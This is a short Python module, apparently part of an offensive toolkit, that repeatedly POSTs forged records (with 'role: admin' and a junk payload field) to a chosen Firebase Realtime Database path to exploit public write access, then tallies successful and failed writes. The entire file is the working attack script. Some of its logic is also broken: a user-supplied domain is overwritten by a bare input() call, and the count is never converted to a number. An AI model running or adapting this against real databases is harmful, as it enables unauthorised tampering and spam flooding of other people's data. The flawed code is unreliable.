import requests
import json
import time

from app.utility.colors import C

REQUIRED_OPTIONS = {"DOMAIN": "", "PATH": "", "MESSAGE": "(ex: who am i)", "COUNT": "ex: 1000"}


def execute(options):
    """
    Performing a POST Data Injection attack directly to the Firebase Realtime Database
    to test Public Write Access with a custom number of submissions.
    """
    print(f"{C.MENU}--- FIREBASE API WRITE EXPLOIT ---")

    # Input URL DB
    target_url = options.get("DOMAIN")
    target_url = input().replace("http://", "").replace("https://", "")

    # Input path endpoint
    endpoint_path = options.get("PATH")

    # Input message
    message = options.get("MESSAGE")

    # Input the number of exploits
    try:
        count = options.get("COUNT")
    except ValueError:
        print(f"{C.ERROR} Must be a number!")
        return

    # Ensure the URL is formed correctly
    url = f"https://{target_url}/{endpoint_path}.json"

    print(f"{C.MENU}\n[!] URL: {url}")
    print(f"{C.MENU}[!] Mengirim {count} Document.\n")

    success_count = 0
    fail_count = 0
    delay = 0.5

    # --- REPEATED SHIPPING ---
    for i in range(count):
        current_time = int(time.time())
        payload_data = {
            "author": "Anonymous",
            "message": f"{message} (#{i+1})",
            "timestamp": current_time,
            "payload": "(_)/&$$@//Exploit\{war}!*",
            "role": "admin",
            "status": "SUCCESS",
        }

        try:
            response = requests.post(
                url,
                headers={"Content-Type": "application/json"},
                data=json.dumps(payload_data),
                timeout=10,
            )

            if response.status_code == 200:
                print(
                    f"{C.SUCCESS} [{i+1}/{count}] ✅ Success!	|	Status: {response.status_code}	|	ID: {response.json().get('name')}"
                )
                success_count += 1
            else:
                print(
                    f"{C.ERROR} [{i+1}/{count}] ❌ Access denied.	|	Status: {response.status_code}"
                )
                fail_count += 1

            if i < count - 1:
                time.sleep(delay)
        except requests.exceptions.RequestException as e:
            print(f"{C.ERROR} \n❌ CONNECTION ERROR on sending to-{i+1}/{count}")
            fail_count += 1
            print(f"{C.ERROR}ERROR: {e}")

    # Log output
    print(f"\n{C.MENU}--- EXPLOITATION SUMMARY ---")
    print(f"{C.SUCCESS} Total Success: {success_count}")
    print(f"{C.ERROR} Total Fail: {fail_count}")
